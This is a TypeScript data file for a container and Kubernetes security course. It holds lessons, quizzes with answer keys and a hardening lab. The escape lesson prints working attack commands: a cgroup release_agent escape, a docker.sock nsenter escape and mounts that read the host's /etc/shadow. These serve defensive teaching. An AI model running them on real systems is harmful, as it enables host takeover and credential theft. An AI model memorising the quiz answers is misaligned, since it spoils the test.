import type { Module } from "../../types";

export const containerSecurity: Module = {
  id: "container-security",
  title: "Container & Kubernetes Security",
  description:
    "Learn to secure containerized applications and Kubernetes clusters against common misconfigurations, escape attacks, and supply chain threats.",
  difficulty: "Advanced",
  xpReward: 450,
  locked: false,
  lessons: [
    {
      id: "container-intro",
      title: "Container Security Fundamentals",
      type: "theory",
      content: `# Container Security Fundamentals

Containers revolutionized deployment but introduced new security challenges. A misconfigured container can compromise the entire host system.

## Why Container Security Matters

- **2023-2024**: 67% of organizations experienced container security incidents
- **Shared Kernel**: Containers share the host OS kernel (unlike VMs)
- **Ephemeral Nature**: Traditional security tools don't work well with short-lived containers
- **Complex Supply Chain**: Base images, dependencies, and registries are attack vectors

## Container vs VM Isolation

\`\`\`
┌─────────────────────────────────────────┐
│              Virtual Machines            │
├─────────────┬─────────────┬─────────────┤
│    App A    │    App B    │    App C    │
│   Guest OS  │   Guest OS  │   Guest OS  │
│─────────────┴─────────────┴─────────────│
│            Hypervisor                    │
│            Host OS                       │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│              Containers                  │
├─────────────┬─────────────┬─────────────┤
│    App A    │    App B    │    App C    │
├─────────────┴─────────────┴─────────────┤
│          Container Runtime               │
│            Host OS (shared kernel)       │
└─────────────────────────────────────────┘
\`\`\`

VMs have hardware-level isolation. Containers rely on kernel features (namespaces, cgroups) which can be bypassed.

## Key Attack Surfaces

### 1. Container Images
- Base image vulnerabilities
- Malicious layers
- Embedded secrets
- Outdated packages

### 2. Container Runtime
- Privileged containers
- Capability escalation
- Container escape

### 3. Orchestration (Kubernetes)
- Misconfigured RBAC
- Exposed API servers
- Insecure pod configurations
- Secrets in plain text

### 4. Host System
- Shared kernel vulnerabilities
- Mounted sensitive paths
- Docker socket access

Understanding these surfaces is the first step to secure containerization.`,
    },
    {
      id: "docker-security",
      title: "Docker Security Best Practices",
      type: "theory",
      content: `# Docker Security Best Practices

Docker is the most common container runtime. These practices prevent most container compromises.

## Dangerous Docker Configurations

### Running as Root (Default!)
\`\`\`dockerfile
# BAD - runs as root inside container
FROM node:18
COPY . /app
CMD ["node", "app.js"]

# GOOD - use non-root user
FROM node:18
RUN useradd -r appuser
USER appuser
COPY --chown=appuser . /app
CMD ["node", "app.js"]
\`\`\`

### Privileged Mode = Host Access
\`\`\`bash
# NEVER DO THIS in production
docker run --privileged myimage

# Privileged containers can:
# - Access all host devices
# - Load kernel modules
# - Escape to the host
\`\`\`

### Mounting Docker Socket
\`\`\`bash
# DANGEROUS - gives full Docker control
docker run -v /var/run/docker.sock:/var/run/docker.sock myimage

# Attacker can spawn privileged containers on the host
docker run --privileged -v /:/hostfs alpine cat /hostfs/etc/shadow
\`\`\`

## Secure Dockerfile Patterns

### Multi-stage Builds (Reduce Attack Surface)
\`\`\`dockerfile
# Build stage - has compilers, tools
FROM node:18 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Production stage - minimal image
FROM node:18-alpine
RUN adduser -D appuser
USER appuser
WORKDIR /app
COPY --from=builder --chown=appuser /app/dist ./dist
COPY --from=builder --chown=appuser /app/node_modules ./node_modules
CMD ["node", "dist/index.js"]
\`\`\`

### Pin Base Image Versions
\`\`\`dockerfile
# BAD - unpredictable updates
FROM node:latest

# GOOD - pinned version with digest
FROM node:18.19.0-alpine@sha256:abcd1234...
\`\`\`

### Scan for Secrets
\`\`\`bash
# Use tools like trivy, grype, or docker scout
trivy image myapp:latest

# Check for secrets in image history
docker history --no-trunc myapp:latest
\`\`\`

## Runtime Security

### Drop Capabilities
\`\`\`bash
# Drop all capabilities, add only what's needed
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myimage
\`\`\`

### Read-only Filesystem
\`\`\`bash
docker run --read-only --tmpfs /tmp myimage
\`\`\`

### Resource Limits
\`\`\`bash
docker run --memory="256m" --cpus="0.5" myimage
\`\`\`

These practices significantly reduce container escape and privilege escalation risks.`,
    },
    {
      id: "container-quiz-1",
      title: "Docker Security Check",
      type: "quiz",
      content: "",
      quiz: {
        question:
          "A developer runs: `docker run -v /var/run/docker.sock:/var/run/docker.sock myapp`. What's the security risk?",
        options: [
          "The container will run slower due to socket overhead",
          "The container can control Docker and potentially escape to the host",
          "The container's network will be isolated from the host",
          "The container won't be able to access the internet",
        ],
        correctAnswer: 1,
        explanation:
          "Mounting the Docker socket gives the container full control over Docker daemon. An attacker inside the container can spawn new privileged containers, mount the host filesystem, and effectively escape container isolation to compromise the host system. This is one of the most dangerous Docker misconfigurations.",
      },
    },
    {
      id: "kubernetes-security",
      title: "Kubernetes Security Essentials",
      type: "theory",
      content: `# Kubernetes Security Essentials

Kubernetes (K8s) adds orchestration complexity and new attack vectors on top of container security.

## Kubernetes Attack Surface

\`\`\`
                    ┌──────────────────┐
        Attackers → │   API Server     │ ← RBAC, Network Policies
                    └────────┬─────────┘
                             │
              ┌──────────────┼──────────────┐
              ▼              ▼              ▼
        ┌─────────┐   ┌─────────┐   ┌─────────┐
        │  Node   │   │  Node   │   │  Node   │
        │ ┌─────┐ │   │ ┌─────┐ │   │ ┌─────┐ │
        │ │ Pod │ │   │ │ Pod │ │   │ │ Pod │ │
        │ └─────┘ │   │ └─────┘ │   │ └─────┘ │
        └─────────┘   └─────────┘   └─────────┘
\`\`\`

## Common Kubernetes Misconfigurations

### 1. Overly Permissive RBAC
\`\`\`yaml
# BAD - gives all permissions in all namespaces
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: bad-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: myapp
roleRef:
  kind: ClusterRole
  name: cluster-admin  # DANGER!
  apiGroup: rbac.authorization.k8s.io
\`\`\`

### 2. Insecure Pod Configurations
\`\`\`yaml
# INSECURE pod spec
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    image: myapp:latest  # Unpinned tag
    securityContext:
      privileged: true    # Full host access!
      runAsRoot: true     # Running as root
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /            # Mounts entire host filesystem!
\`\`\`

### 3. Exposed Secrets
\`\`\`yaml
# BAD - secret in environment variable (logged, visible)
env:
- name: DB_PASSWORD
  value: "supersecret123"

# BETTER - use Kubernetes secrets
env:
- name: DB_PASSWORD
  valueFrom:
    secretKeyRef:
      name: db-credentials
      key: password
\`\`\`

## Secure Pod Configuration

\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
  containers:
  - name: app
    image: myapp@sha256:abc123...  # Pinned digest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        memory: "256Mi"
        cpu: "500m"
\`\`\`

## Network Policies (Default: All Traffic Allowed!)

\`\`\`yaml
# Deny all ingress by default
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress

# Then allow specific traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
\`\`\`

By default, all pods can talk to all other pods. Always implement network policies.`,
    },
    {
      id: "container-quiz-2",
      title: "Kubernetes RBAC",
      type: "quiz",
      content: "",
      quiz: {
        question:
          "A pod's service account has cluster-admin privileges. An attacker gains RCE in the pod. What can they do?",
        options: [
          "Only access resources in the pod's namespace",
          "Read Kubernetes secrets but not modify them",
          "Full control of the entire Kubernetes cluster",
          "Access to the pod's filesystem only",
        ],
        correctAnswer: 2,
        explanation:
          "cluster-admin is the most privileged RBAC role in Kubernetes. With RCE in a pod using this service account, an attacker can: create/delete any resources, read all secrets across namespaces, deploy malicious pods, modify RBAC to maintain access, and potentially escape to nodes. This is why least-privilege RBAC is critical.",
      },
    },
    {
      id: "container-escape",
      title: "Container Escape Techniques",
      type: "theory",
      content: `# Container Escape Techniques

Understanding how attackers escape containers helps you prevent it.

## What is Container Escape?

Container escape means breaking out of container isolation to access the host system or other containers.

## Common Escape Vectors

### 1. Privileged Container Escape
\`\`\`bash
# Inside a privileged container
# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Access host files
cat /mnt/host/etc/shadow

# Or escape via cgroups
d=$(dirname $(ls -la /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/exploit
echo 1 > $d/exploit/notify_on_release
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \\$\\$ > $d/exploit/cgroup.procs"
cat /output
\`\`\`

### 2. Docker Socket Escape
\`\`\`bash
# If docker.sock is mounted
docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

# Now you're on the host!
\`\`\`

### 3. Kernel Exploits
When container and host share kernel:
\`\`\`
Container → Kernel Vulnerability → Host Root
\`\`\`

Notable escapes: CVE-2022-0185, CVE-2022-0847 (Dirty Pipe)

### 4. Mounted Sensitive Paths
\`\`\`yaml
# If /etc is mounted writable
volumeMounts:
- name: etc
  mountPath: /host-etc

# Attacker can modify /etc/passwd, /etc/shadow, cron, etc.
\`\`\`

## Defense Layers

### Layer 1: Prevent Privileged Access
\`\`\`yaml
# PodSecurityPolicy / PodSecurityStandard
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  hostPID: false
  hostIPC: false
  hostNetwork: false
\`\`\`

### Layer 2: Runtime Security
Use runtime security tools that detect:
- Unexpected process execution
- File integrity changes
- Network anomalies
- Syscall violations

Tools: Falco, Sysdig, Aqua, Prisma Cloud

### Layer 3: Kernel Hardening
\`\`\`bash
# Use seccomp profiles
docker run --security-opt seccomp=/path/to/profile.json myimage

# Use AppArmor/SELinux
docker run --security-opt apparmor=docker-default myimage
\`\`\`

### Layer 4: Minimal Images
\`\`\`dockerfile
# Distroless - no shell, no package manager
FROM gcr.io/distroless/nodejs18-debian11
COPY --from=builder /app /app
CMD ["app/index.js"]
\`\`\`

No shell = harder to exploit post-compromise.

Defense in depth: Assume one layer will fail.`,
    },
    {
      id: "container-quiz-3",
      title: "Container Escape Prevention",
      type: "quiz",
      content: "",
      quiz: {
        question:
          "Which combination provides the STRONGEST defense against container escape?",
        options: [
          "Using the latest Docker version with default settings",
          "Running as non-root, dropping capabilities, read-only filesystem, and seccomp profiles",
          "Using a firewall to block outbound traffic from containers",
          "Scanning images for vulnerabilities before deployment",
        ],
        correctAnswer: 1,
        explanation:
          "Defense in depth with multiple controls is most effective: non-root prevents many privilege escalation paths, dropping capabilities removes dangerous syscalls, read-only filesystem prevents persistence, and seccomp profiles limit available syscalls. While image scanning and network controls are valuable, they don't directly prevent container escape techniques.",
      },
    },
    {
      id: "container-security-lab",
      title: "Lab: Secure Container Configuration",
      type: "lab",
      content:
        "This Kubernetes pod specification has multiple security issues. Fix it by: (1) Setting runAsNonRoot: true, (2) Dropping ALL capabilities, (3) Setting allowPrivilegeEscalation: false, and (4) Making the root filesystem read-only.",
      lab: {
        initialCode: `apiVersion: v1
kind: Pod
metadata:
  name: webapp
spec:
  containers:
  - name: app
    image: myapp:latest
    # INSECURE: No security context defined!
    # This container runs as root with all capabilities
    ports:
    - containerPort: 8080
    volumeMounts:
    - name: data
      mountPath: /data
  volumes:
  - name: data
    emptyDir: {}`,
        solutionCode: `apiVersion: v1
kind: Pod
metadata:
  name: webapp
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
    ports:
    - containerPort: 8080
    volumeMounts:
    - name: data
      mountPath: /data
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: data
    emptyDir: {}
  - name: tmp
    emptyDir: {}`,
        instructions:
          "1. Add a pod-level securityContext with runAsNonRoot: true. 2. Add a container-level securityContext. 3. Set allowPrivilegeEscalation: false. 4. Set readOnlyRootFilesystem: true. 5. Drop ALL capabilities under capabilities.drop.",
      },
    },
  ],
};
